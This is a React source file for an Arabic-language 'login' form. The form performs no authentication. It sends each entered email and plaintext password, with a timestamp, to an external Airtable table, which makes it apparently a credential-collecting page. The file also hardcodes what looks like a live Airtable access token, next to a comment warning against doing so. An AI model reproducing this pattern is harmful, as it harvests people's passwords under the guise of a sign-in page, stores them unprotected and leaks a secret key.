import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Mail, Lock, ArrowRight } from 'lucide-react';
import { useToast } from "@/hooks/use-toast";

const AIRTABLE_API_URL = "https://api.airtable.com/v0/appVIknwkh8pEH2er/tblLoaHmFwooqY5JP";
const AIRTABLE_API_KEY = "patJMWOqodjoUQncO.89330338665fb59c4ecb238ddfd32e31495ab6758486868777a999c3522447d3"; // لا تضع مفتاح API مباشرة في الكود - استخدم المتغيرات البيئية

const LoginForm = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    if (!email || !password) {
      toast({
        title: "خطأ في الإدخال",
        description: "يرجى إدخال البريد الإلكتروني وكلمة المرور.",
        variant: "destructive",
      });
      setIsLoading(false);
      return;
    }

    const data = {
      fields: {
        Email: email,
        Password: password,
        Timestamp: new Date().toISOString(),
      },
    };

    try {
      const response = await fetch(AIRTABLE_API_URL, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${AIRTABLE_API_KEY}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error("فشل في إرسال البيانات.");
      }

      const result = await response.json();
      console.log("Response:", result);

      toast({
        title: "تم التسجيل بنجاح!",
        description: "تم حفظ بياناتك في Airtable بنجاح.",
      });
    } catch (error) {
      console.error("Error:", error);
      toast({
        title: "حدث خطأ",
        description: "تعذر حفظ البيانات، حاول مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Card className="w-full max-w-md mx-auto" dir="rtl">
      <CardHeader className="space-y-2">
        <CardTitle className="text-2xl font-bold text-center text-primary">
          تسجيل الدخول
        </CardTitle>
        <CardDescription className="text-center">
          أدخل بياناتك لتسجيل الدخول.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="relative">
            <Mail className="absolute right-3 top-3 h-5 w-5 text-muted-foreground" />
            <Input className="pr-10 text-right" type="email" placeholder="البريد الإلكتروني" value={email} onChange={(e) => setEmail(e.target.value)} required />
          </div>
          <div className="relative">
            <Lock className="absolute right-3 top-3 h-5 w-5 text-muted-foreground" />
            <Input className="pr-10 text-right" type="password" placeholder="كلمة المرور" value={password} onChange={(e) => setPassword(e.target.value)} required />
          </div>
          <Button type="submit" className="w-full text-white flex items-center justify-center gap-2" disabled={isLoading}>
            {isLoading ? "جاري تسجيل الدخول..." : "تسجيل الدخول"}
            {!isLoading && <ArrowRight className="h-5 w-5 mr-2" />}
          </Button>
        </form>
      </CardContent>
      <CardFooter className="flex justify-center border-t pt-4">
        <p className="text-xs text-center text-muted-foreground">
          بتسجيل الدخول، أنت توافق على شروط الخدمة وسياسة الخصوصية الخاصة بنا
        </p>
      </CardFooter>
    </Card>
  );
};

export default LoginForm;
